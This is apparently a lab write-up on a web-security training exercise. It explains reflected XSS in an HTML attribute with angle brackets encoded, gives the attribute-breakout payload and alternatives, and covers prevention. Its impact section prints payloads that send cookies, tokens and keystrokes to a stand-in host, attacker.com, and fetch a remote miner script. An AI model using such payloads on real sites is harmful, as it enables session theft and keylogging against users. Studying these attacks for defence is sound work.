# Reflected XSS into Attribute with Angle Brackets HTML-Encoded

## Lab Overview
**Difficulty:** Apprentice  
**Vulnerability Type:** Reflected Cross-Site Scripting (XSS)  
**Context:** HTML Attribute Injection  
**Status:** ✅ Solved

---

## What is Reflected XSS?

Reflected XSS occurs when user input is immediately returned (reflected) in the HTTP response without proper sanitization. The malicious script executes in the victim's browser when they visit a crafted URL.

### Key Difference from DOM XSS
- **Reflected XSS:** Server-side - Input goes to server and comes back in response
- **DOM XSS:** Client-side - Input is processed entirely in browser JavaScript

---

## The Challenge

### What's Being Blocked
The application HTML-encodes angle brackets:
- `<` becomes `&lt;`
- `>` becomes `&gt;`

This means traditional XSS payloads won't work:
```html
<script>alert(1)</script>           ❌ Becomes: &lt;script&gt;alert(1)&lt;/script&gt;
<img src=x onerror=alert(1)>        ❌ Becomes: &lt;img src=x onerror=alert(1)&gt;
<svg onload=alert(1)>               ❌ Becomes: &lt;svg onload=alert(1)&gt;
```

### The Reflection Point
When you search for something, your input is reflected into an HTML **attribute**:

**Search for:** `test`

**Result in HTML:**
```html
<input type="text" name="search" value="test">
```

The vulnerability is in the `value` attribute of the search input field!

---

## Understanding Attribute Context XSS

### What is Attribute Context?
Your input appears **inside** an HTML attribute, not as HTML content.

```html
<!-- Content context (between tags) -->
<div>YOUR_INPUT_HERE</div>

<!-- Attribute context (inside attribute value) -->
<input value="YOUR_INPUT_HERE">
```

### Why This Matters
In attribute context:
- You can't create new tags (angle brackets are encoded)
- But you CAN break out of the current attribute
- And inject NEW attributes with event handlers
- Event handlers execute JavaScript!

---

## The Solution

### Working Payload
```
" autofocus onfocus=alert(1) x="
```

### How It Exploits the Vulnerability

**Step 1: Original HTML**
```html
<input type="text" name="search" value="">
```

**Step 2: Inject the Payload**
User searches for: `" autofocus onfocus=alert(1) x="`

**Step 3: Server Reflects It**
```html
<input type="text" name="search" value="" autofocus onfocus=alert(1) x="">
```

**Step 4: Browser Parses the Attributes**
- `value=""` - Empty value (we closed it with the first quote)
- `autofocus` - Boolean attribute (makes input auto-focus on page load)
- `onfocus=alert(1)` - Event handler (executes when input receives focus)
- `x=""` - Dummy attribute (consumes the trailing quote from original HTML)

**Step 5: Execution**
1. Page loads
2. `autofocus` makes the input field automatically gain focus
3. Focus event triggers
4. `onfocus` handler executes `alert(1)`
5. Lab solved! ✅

---

## Payload Breakdown

### Character-by-Character Analysis

```
" autofocus onfocus=alert(1) x="
```

| Part | Purpose | Explanation |
|------|---------|-------------|
| `"` | Close attribute | Closes the original `value="` attribute |
| ` ` | Separator | Space separates attributes in HTML |
| `autofocus` | Auto-trigger | Boolean attribute that focuses input on load |
| ` ` | Separator | Space before next attribute |
| `onfocus=alert(1)` | Payload | Event handler that executes JavaScript |
| ` ` | Separator | Space before final attribute |
| `x="` | Quote consumer | Dummy attribute to consume the trailing `"` |

### Why Each Part is Necessary

**Why the first `"`?**
- Closes the `value` attribute so we can add new attributes

**Why `autofocus`?**
- Automatically triggers the focus event when page loads
- Without it, user would need to manually click the input

**Why `onfocus=alert(1)`?**
- Executes our JavaScript when input gains focus
- This is our actual payload

**Why `x="`?**
- The original HTML has a closing quote: `value="...">`
- After we inject, there's a trailing quote that needs to be consumed
- `x="` opens a dummy attribute that consumes it

---

## Alternative Payloads

### Using Single Quotes (if server uses them)
```
' autofocus onfocus=alert(1) x='
```

### Using Different Event Handlers

#### onmouseover - Triggers on hover
```
" onmouseover=alert(1) x="
```
**Pros:** Works without autofocus  
**Cons:** Requires user to hover over input

#### onclick - Triggers on click
```
" onclick=alert(1) x="
```
**Pros:** Simple and reliable  
**Cons:** Requires user to click the input

#### onanimationstart - Triggers automatically
```
" onanimationstart=alert(1) style=animation:x x="
```
**Pros:** Auto-triggers like autofocus  
**Cons:** More complex, might be filtered

#### onauxclick - Triggers on middle/right click
```
" onauxclick=alert(1) x="
```

#### onbeforeinput - Triggers when typing starts
```
" onbeforeinput=alert(1) x="
```

### Without Consuming the Quote (rare scenarios)
```
" autofocus onfocus=alert(1)//
```
Uses JavaScript comment `//` to comment out the trailing quote

---

## Step-by-Step Solution Process

### Step 1: Identify the Reflection Point
1. Go to the blog page
2. Use the search functionality
3. Search for a test string like `test123`
4. View page source (Ctrl+U or right-click → View Source)
5. Search for `test123` in the source code
6. Identify where it appears (should be in an `<input>` tag's `value` attribute)

### Step 2: Confirm Quote Type
Check what quote character wraps the value:
```html
<input value="test123">      <!-- Double quotes -->
<input value='test123'>      <!-- Single quotes -->
```

### Step 3: Craft the Payload
Use matching quotes to break out:
- If double quotes: `" autofocus onfocus=alert(1) x="`
- If single quotes: `' autofocus onfocus=alert(1) x='`

### Step 4: Execute the Attack
1. Enter the payload in the search box
2. Click "Search" button
3. Page will reload with your payload in URL and HTML
4. Input will auto-focus and trigger the alert

### Step 5: Verify Success
- Alert box should appear with message "1"
- Lab status should change to "Solved"

---

## Testing Methodology

### Discovery Process

**1. Identify Input Points**
- Search boxes
- Contact forms
- URL parameters
- Login forms
- Any user-controllable input

**2. Test for Reflection**
```
Search for: xyztestxyz123
Check if it appears in the response
```

**3. Determine Context**
View source and find where input appears:
- Between HTML tags? (Content context)
- Inside an attribute? (Attribute context)
- Inside JavaScript? (JavaScript context)
- Inside CSS? (Style context)

**4. Test Encoding**
```
Try: <script>alert(1)</script>
Check if: &lt;script&gt;alert(1)&lt;/script&gt;
Result: Angle brackets are encoded!
```

**5. Attempt Attribute Breakout**
```
Try: " onfocus=alert(1) x="
Check the HTML source after submission
Verify attributes are injected correctly
```

**6. Add Auto-Trigger**
```
Try: " autofocus onfocus=alert(1) x="
This automatically triggers the payload
```

---

## Why Traditional Payloads Fail

### Payload Attempts and Results

| Payload | Result | Why it Fails |
|---------|--------|--------------|
| `<script>alert(1)</script>` | `&lt;script&gt;alert(1)&lt;/script&gt;` | Angle brackets encoded |
| `<img src=x onerror=alert(1)>` | `&lt;img src=x onerror=alert(1)&gt;` | Angle brackets encoded |
| `javascript:alert(1)` | Reflected but doesn't execute | Not in `href` or similar context |
| `alert(1)` | Just text in value | No execution context |

### What Actually Works
```
" autofocus onfocus=alert(1) x="
```

**Why?**
- No angle brackets needed ✅
- Uses HTML attributes (not new tags) ✅
- Event handlers execute JavaScript ✅
- Autofocus provides auto-trigger ✅

---

## Prevention Strategies

### For Developers

#### ❌ Insufficient Protection
```php
// This only encodes < and >
$safe = htmlspecialchars($input);
echo '<input value="' . $safe . '">';
```

**Problem:** Doesn't encode quotes, allowing attribute breakout!

#### ✅ Proper Protection
```php
// Encode quotes too
$safe = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
echo '<input value="' . $safe . '">';
```

**Result:** `"` becomes `&quot;`, preventing breakout

#### Best Practices

**1. Always Use ENT_QUOTES Flag**
```php
htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```
Encodes:
- `"` → `&quot;`
- `'` → `&#039;`
- `<` → `&lt;`
- `>` → `&gt;`
- `&` → `&amp;`

**2. Context-Aware Output Encoding**
```javascript
// JavaScript context
let safe = input.replace(/['"\\]/g, '\\$&');

// URL context
let safe = encodeURIComponent(input);

// HTML attribute context
let safe = input.replace(/["'<>&]/g, (char) => {
    const entities = {'"': '&quot;', "'": '&#39;', '<': '&lt;', '>': '&gt;', '&': '&amp;'};
    return entities[char];
});
```

**3. Use Content Security Policy (CSP)**
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

**4. Input Validation**
```php
// Validate input format
if (!preg_match('/^[a-zA-Z0-9\s]+$/', $search)) {
    die('Invalid search term');
}
```

**5. Use Modern Frameworks**
- React, Vue, Angular auto-escape by default
- Template engines with auto-escaping (Twig, Jinja2)

---

## Real-World Impact

### Severity: High

**What Attackers Can Do:**
1. **Cookie Theft**
   ```
   " onfocus=fetch('//attacker.com?c='+document.cookie) x="
   ```

2. **Session Hijacking**
   ```
   " onfocus=location='//attacker.com/steal?s='+localStorage.token x="
   ```

3. **Keylogging**
   ```
   " onfocus=document.onkeypress=function(e){fetch('//attacker.com?k='+e.key)} x="
   ```

4. **Phishing**
   ```
   " onfocus=document.body.innerHTML='<h1>Login Required</h1><form>...' x="
   ```

5. **Cryptocurrency Mining**
   ```
   " onfocus=eval(fetch('//attacker.com/miner.js')) x="
   ```

### Attack Delivery Methods
1. **Social Engineering:** Send crafted URL via email/chat
2. **Forum Posts:** Post malicious link in comments
3. **Ads:** Purchase ads with malicious links
4. **QR Codes:** Generate QR code pointing to exploit URL

---

## Attack Flow Diagram

```
┌─────────────────────────────────────────────────────┐
│ 1. Attacker crafts malicious URL                   │
│    ?search=" autofocus onfocus=alert(1) x="        │
└───────────────┬─────────────────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────────────────┐
│ 2. Victim clicks link (via email, social media,    │
│    forum, etc.)                                     │
└───────────────┬─────────────────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────────────────┐
│ 3. Browser sends request to vulnerable server      │
│    GET /?search=" autofocus onfocus=alert(1) x="   │
└───────────────┬─────────────────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────────────────┐
│ 4. Server reflects input into HTML response        │
│    <input value="" autofocus onfocus=alert(1) x="">│
└───────────────┬─────────────────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────────────────┐
│ 5. Browser parses HTML and executes JavaScript     │
│    - autofocus makes input gain focus              │
│    - onfocus handler triggers                       │
│    - alert(1) executes                             │
└───────────────┬─────────────────────────────────────┘
                │
                ▼
┌─────────────────────────────────────────────────────┐
│ 6. Malicious payload runs in victim's context      │
│    - Can steal cookies, tokens, passwords          │
│    - Can modify page content                        │
│    - Can make requests on behalf of victim         │
└─────────────────────────────────────────────────────┘
```

---

## Common HTML Attributes with Event Handlers

These can all be used for XSS in attribute context:

### Mouse Events
- `onclick` - When element is clicked
- `ondblclick` - When element is double-clicked
- `onmousedown` - When mouse button pressed
- `onmouseup` - When mouse button released
- `onmouseover` - When mouse enters element
- `onmousemove` - When mouse moves over element
- `onmouseout` - When mouse leaves element
- `onmouseenter` - When mouse enters element (doesn't bubble)
- `onmouseleave` - When mouse leaves element (doesn't bubble)

### Keyboard Events
- `onkeydown` - When key is pressed down
- `onkeyup` - When key is released
- `onkeypress` - When key is pressed (deprecated)

### Form Events
- `onfocus` - When element gains focus ⭐ (Used in our exploit)
- `onblur` - When element loses focus
- `onchange` - When value changes
- `oninput` - When value is being input
- `onsubmit` - When form is submitted
- `onreset` - When form is reset

### Media Events
- `onload` - When resource loads
- `onerror` - When loading error occurs
- `onplay` - When media starts playing
- `onpause` - When media is paused

### Animation/CSS Events
- `onanimationstart` - When CSS animation starts
- `onanimationend` - When CSS animation ends
- `ontransitionend` - When CSS transition ends

### Other Useful Events
- `onwheel` - When mouse wheel scrolls
- `ondrag` - When element is dragged
- `ondrop` - When dragged element is dropped
- `ontoggle` - When details element is toggled

---

## Key Takeaways

✅ **Reflected XSS** - Server reflects user input back in response  
✅ **HTML Encoding** - Encodes `<>` but not always quotes  
✅ **Attribute Context** - Input appears inside HTML attribute value  
✅ **Attribute Breakout** - Use quotes to close attribute and add new ones  
✅ **Event Handlers** - Execute JavaScript without needing `<script>` tags  
✅ **Auto-trigger** - Use `autofocus` to trigger payload automatically  
✅ **Prevention** - Always use `ENT_QUOTES` flag in encoding functions  

---

## References & Resources

- [PortSwigger: Cross-site scripting contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [OWASP: XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [HTML Event Attributes](https://www.w3schools.com/tags/ref_eventattributes.asp)
- [MDN: HTML Attributes](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes)
- [PortSwigger: Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)

---

**Date Completed:** February 2, 2026  
**Working Payload:** `" autofocus onfocus=alert(1) x="`  
**Key Technique:** Attribute breakout + event handler injection + auto-focus trigger
